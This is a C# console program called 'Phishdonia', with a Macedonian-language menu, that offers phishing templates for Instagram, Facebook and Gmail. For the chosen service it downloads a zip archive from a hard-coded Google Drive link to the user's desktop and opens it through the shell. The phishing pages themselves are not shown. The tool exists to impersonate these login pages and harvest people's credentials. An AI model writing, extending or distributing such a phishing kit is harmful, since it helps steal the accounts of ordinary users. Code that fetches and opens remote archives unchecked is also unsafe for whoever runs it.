using System;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace MPhish
{
    class Phishdonia
    {
        static async Task Main(string[] args)
        {
            Console.OutputEncoding = Encoding.UTF8;
            ShowMenu();
            int choice = GetChoice();
            await ExecuteChoice(choice);
        }

        static void ShowMenu()
        {
            Console.Clear();
            CenterText("   ▄███████▄    ▄█    █▄     ▄█     ▄████████    ▄█    █▄    ████████▄   ▄██████▄  ███▄▄▄▄    ▄█     ▄████████", ConsoleColor.Red);
            CenterText("  ███    ███   ███    ███   ███    ███    ███   ███    ███   ███   ▀███ ███    ███ ███▀▀▀██▄ ███    ███    ███", ConsoleColor.Red);
            CenterText("  ███    ███   ███    ███   ███▌   ███    █▀    ███    ███   ███    ███ ███    ███ ███   ███ ███▌   ███    ███", ConsoleColor.Red);
            CenterText("  ███    ███  ▄███▄▄▄▄███▄▄ ███▌   ███         ▄███▄▄▄▄███▄▄ ███    ███ ███    ███ ███   ███ ███▌   ███    ███", ConsoleColor.Red);
            CenterText("▀█████████▀  ▀▀███▀▀▀▀███▀  ███▌ ▀███████████ ▀▀███▀▀▀▀███▀  ███    ███ ███    ███ ███   ███ ███▌ ▀███████████", ConsoleColor.Red);
            CenterText("  ███          ███    ███   ███           ███   ███    ███   ███    ███ ███    ███ ███   ███ ███    ███    ███", ConsoleColor.Red);
            CenterText("  ███          ███    ███   ███     ▄█    ███   ███    ███   ███   ▄███ ███    ███ ███   ███ ███    ███    ███", ConsoleColor.Red);
            CenterText(" ▄████▀        ███    █▀    █▀    ▄████████▀    ███    █▀    ████████▀   ▀██████▀   ▀█   █▀  █▀     ███    █▀", ConsoleColor.Red);
            CenterText("</> Author: Leonid Krstevski | Леонид Крстевски", ConsoleColor.Magenta);
            CenterText("=================================================", ConsoleColor.Magenta);
            CenterText("Github: l3069", ConsoleColor.Magenta);
            CenterText("=================================================", ConsoleColor.Magenta);
            CenterText("[!] Бета Верзија [!]", ConsoleColor.Green);
            Console.WriteLine();
            Console.WriteLine();
            CenterText("Опции:", ConsoleColor.Magenta);
            CenterText("[1] Instagram / Инстаграм", ConsoleColor.Magenta);
            CenterText("[2] Facebook / Фејзбук", ConsoleColor.Magenta);
            CenterText("[3] Gmail / Г-маил", ConsoleColor.Magenta);
            Console.WriteLine();
            CenterText("[0] ИЗЛЕЗИ", ConsoleColor.Magenta);
            Console.WriteLine();
        }

        static void CenterText(string text, ConsoleColor color)
        {
            int screenWidth = Console.WindowWidth;
            int textWidth = text.Length;
            int spaces = (screenWidth / 2) + (textWidth / 2);
            Console.ForegroundColor = color;
            Console.WriteLine(text.PadLeft(spaces));
            Console.ResetColor();
        }

        static int GetChoice()
        {
            PrintMessage("Изберете опција: ", ConsoleColor.Yellow);
            string input = Console.ReadLine();
            int choice;
            while (!int.TryParse(input, out choice) || (choice != 0 && (choice < 1 || choice > 3)))
            {
                PrintMessage("Грешка. Изберете повторно: ", ConsoleColor.Red);
                input = Console.ReadLine();
            }
            return choice;
        }

        static async Task ExecuteChoice(int choice)
        {
            if (choice == 0)
            {
                Environment.Exit(0);
            }
            else
            {
                string url = choice switch
                {
                    1 => "https://drive.google.com/uc?export=download&id=1yL-z4Nffm79hgZVnwjNvJqJ0SxU8XfBI",
                    2 => "https://drive.google.com/uc?export=download&id=1YsuOdCOzRs16cHp4oCgJRRd-01M4lR1y",
                    3 => "https://drive.google.com/uc?export=download&id=1JxpEquH3TJtpinmEL7h9jtgca9kctMpa",
                    _ => throw new ArgumentOutOfRangeException()
                };

                string fileName = choice switch
                {
                    1 => "Instagram.zip",
                    2 => "Facebook.zip",
                    3 => "Gmail.zip",
                    _ => throw new ArgumentOutOfRangeException()
                };

                string desktopPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), fileName);

                await DownloadFileAsync(url, desktopPath);
                OpenFile(desktopPath);
            }
        }

        static async Task DownloadFileAsync(string url, string destinationPath)
        {
            try
            {
                using HttpClient client = new HttpClient();
                using HttpResponseMessage response = await client.GetAsync(url);
                response.EnsureSuccessStatusCode();
                await using var fs = new FileStream(destinationPath, FileMode.Create, FileAccess.Write, FileShare.None);
                await response.Content.CopyToAsync(fs);
                PrintMessage($"Фајлот е успешно сместен во '{destinationPath}'.", ConsoleColor.Green);
            }
            catch (Exception ex)
            {
                PrintMessage($"Настана грешка: {ex.Message}", ConsoleColor.Red);
            }
        }

        static void OpenFile(string filePath)
        {
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = filePath,
                    UseShellExecute = true
                });
            }
            catch (Exception ex)
            {
                PrintMessage($"Грешка во отварање на фајлот: {ex.Message}", ConsoleColor.Red);
            }
        }

        static void PrintMessage(string message, ConsoleColor color)
        {
            Console.ForegroundColor = color;
            Console.WriteLine(message);
            Console.ResetColor();
        }
    }
}
